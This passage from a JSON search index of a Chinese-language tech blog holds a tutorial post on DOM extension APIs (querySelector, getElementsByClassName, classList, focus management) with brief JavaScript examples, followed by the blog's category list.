1img&#123;filter:grayscale(100%)&#125;","categories":[{"name":"HTML+CSS","slug":"HTML-CSS","permalink":"https://coloey.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"DOM扩展","slug":"DOM扩展","date":"2021-11-25T08:47:24.000Z","updated":"2021-12-30T07:17:21.260Z","comments":true,"path":"2021/11/25/DOM扩展/","link":"","permalink":"https://coloey.github.io/2021/11/25/DOM%E6%89%A9%E5%B1%95/","excerpt":"","text":"Selectors APIquerySelector()接收CSS选择符参数，返回匹配模式的第一个后代元素，如果没有匹配项则返回null 12345678let body=document.querySelector(&quot;body&quot;);//取得id名为myDiv的元素let myDiv=document.querySelector(&quot;#myDiv&quot;);//取得类名为“selector&quot;的第一个元素let selected=document.querySelector(&quot;.selected&quot;);//取得类名为&quot;button&quot;的图片let img=document.querySelector(&quot;img.button&quot;); querySelectorAll()接收一个查询参数，返回所有匹配的节点，即一个NodeList的静态实例 1234567891011//取得id为&#x27;myDiv&#x27;的&lt;div&gt;元素中的所有&lt;em&gt;元素let ems=document.getElementByid(&#x27;myDiv&#x27;).querySelectorAll(&quot;em&quot;);//取得所有类名中包含&#x27;selected&#x27;的元素let selecteds=document.querySelectorAll(&quot;.selected&quot;);//取得所有是&lt;p&gt;元素子元素的&lt;strong&gt;元素let strongs=document.querySelectorAll(&quot;p strong&quot;);for(let strong of strongs)&#123; strong.className=&quot;important&quot;; //strong.item(i).className=&quot;important&quot;; //strong[i].className=&quot;important&quot;;&#125; HTML5getElementsByClassName()接收一个参数，即包含一个或多个类名的字符串，返回类名中包含相应类的元素的NodeList 1234//取得所有类名中包含&#x27;username&#x27;和&#x27;current&#x27;元素let allCurrentUsernames=document.getElementsByClassName(&quot;username current&quot;);//取得id为“myDiv&quot;的元素子树中所有包含&#x27;selected’类的元素let selected=document.getElementById(&quot;myDiv&quot;).getElementsByClassName(&quot;selected&quot;); 这个方法返回以调用它的对象为根元素的子树中所有匹配的元素，在document上调用getElementsByClassName()返回文档中所有匹配的元素，而在特定元素中调用getElementsByClassName()返回该元素后代中匹配的元素 classList属性 add(value) contains(value) remove(value) toggle(value)：如果类名列表中已经存在指定的value，则删除，如果不存在，添加 123456div.classList.remove(&quot;disabled&quot;);div.classList.add(&quot;current&quot;);//检测类名if(div.classList.contains(&quot;bd&quot;)&amp;&amp;!div.classList.contains(&quot;disabled&quot;))&#123; &#125; 焦点管理12345let button=document.getElementById(&quot;myButton&quot;);button.focus();console.log(document.activeElement===button);console.log(document.hasFocus());//true文档已经拥有焦点","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]}],"categories":[{"name":"http","slug":"http","permalink":"https://coloey.github.io/categories/http/"},{"name":"WebSocket","slug":"WebSocket","permalink":"https://coloey.github.io/categories/WebSocket/"},{"name":"webpack","slug":"webpack","permalink":"https://coloey.github.io/categories/webpack/"},{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"},{"name":"Vue","slug":"Node/Vue","permalink":"https://coloey.github.io/categories/Node/Vue/"},{"name":"HTTP","slug":"HTTP","permalink":"https://coloey.github.io/categories/HTTP/"},{"name":"算法","slug":"算法","permalink":"https://coloey.github.io/categories/%E7%AE%97%E6%B3%95/"},{"name":"HTML5","slug":"Node/HTML5","permalink":"https://coloey.github.io/categories/Node/HTML5/"},{"name":"git","slug":"git","permalink":"https://coloey.github.io/categories/git/"},{"name":"vim","slug":"vim","permalink":"https://coloey.github.io/categories/vim/"},{"name":"Express","slug":"Node/Express","permalink":"https://coloey.github.io/categories/Node/Express/"},{"name":"微信小程序","slug":"微信小程序","permalink":"https://coloey.github.io/categories/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"},{"name":"HTML+CSS","slug":"HTML-CSS","permalink":"https://coloey.github.io/categories/HTML-CSS/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[{"name":"watch","slug":"watch","permalink":"https://coloey.github.io/tags/watch/"}]}